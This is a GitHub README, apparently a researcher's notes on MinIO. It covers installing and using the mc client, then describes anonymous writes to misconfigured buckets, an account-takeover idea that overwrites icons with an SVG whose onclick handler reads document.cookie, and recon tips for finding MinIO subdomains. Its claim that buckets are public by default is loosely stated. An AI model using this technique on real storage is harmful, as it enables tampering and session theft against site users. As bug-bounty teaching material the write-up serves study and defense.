<h1 align="center">
  <br>
  <a href=""><img src="/img/logo.png" alt="" width="300px;"></a>
  <br>
  <img src="https://img.shields.io/badge/PRs-welcome-blue">
  <img src="https://img.shields.io/github/last-commit/kh4sh3i/MinIO">
  <img src="https://img.shields.io/github/commit-activity/m/kh4sh3i/MinIO">
  <a href="https://twitter.com/intent/follow?screen_name=kh4sh3i_"><img src="https://img.shields.io/twitter/follow/kh4sh3i_?style=flat&logo=twitter"></a>
  <a href="https://github.com/kh4sh3i"><img src="https://img.shields.io/github/stars/kh4sh3i?style=flat&logo=github"></a>
</h1>




# MinIO
MinIO Object Storage 🧮

# Minio Console
To copy a file from your localhost to a MinIO server using the mc (MinIO Client), follow these steps:

## 1. Install mc client:
```
curl -O https://dl.min.io/client/mc/release/linux-amd64/mc
chmod +x mc
sudo mv mc /usr/local/bin/
```

## 2. Configure MinIO Client:
```
mc alias set myminio http://minio-server-url:9000 YOUR-ACCESS-KEY YOUR-SECRET-KEY

```

## 3. Copy a file from localhost to MinIO:
```
mc cp /home/user/example.txt myminio/mybucket/
```

# minio vunlenability
by default bucket is public and attacker can write file in minio bucket without any credential !

* default is :
```
mc alias set myminio/ http://MINIO-SERVER MYUSER MYPASSWORD
```

* in vulnerable server use :
```
mc alias set myminio/ http://MINIO-SERVER 
```

## ATO in minio
minio bucket with insufficient permissions that anyone can upload files and overwrite existing files . Attacker can upload malicious svg and overwrite existing icons and takeover any other users account that clicks on application icons such as "sort"

Example of malicious overwritten file :

```
<svg onclick="javascript:console.log(document.cookie)" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M2 12V10.6667H6V12H2ZM2 8.66667V7.33333H10V8.66667H2ZM2 5.33333V4H14V5.33333H2Z" fill="#13141F" fill-opacity="0.9"/>
</svg>
```
https://cdn.target.com/@foo-icon/sort.png
https://minio.target.app/foo-icon/sort.png


## find bucket url
default use @ in url 
```
https://cdn.target.com/@foo-icon/e0a9c740db7682.jpg?width=1920&quality=100

recon subdomani for find minio bucket subdomain : 
https://minio.target.app/foo-icon
```





# Refrence
[min.io](https://min.io/download?license=agpl&platform=linux)